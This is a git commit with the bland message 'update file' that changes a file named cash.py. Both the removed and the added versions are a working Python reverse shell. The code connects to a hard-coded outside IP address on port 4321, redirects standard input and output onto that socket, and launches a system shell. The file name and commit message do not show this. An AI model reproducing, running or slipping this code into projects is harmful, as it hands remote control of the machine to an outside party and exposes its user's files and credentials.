cafffecf9a4a47b1fefa33aac47073fa16590213
EmilLieng <emillieng19980321@outlook.com>
2024-08-13 05:33:33 -0700

    update file

--- cash.py
+++ cash.py
@@ -1,5 +1,5 @@
-import os,pty,socket
-s=socket.socket()
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('194.238.19.162',4321))
 [os.dup2(s.fileno(),f)for f in(0,1,2)]
-pty.spawn('bash')
+subprocess.call(["/bin/sh"])
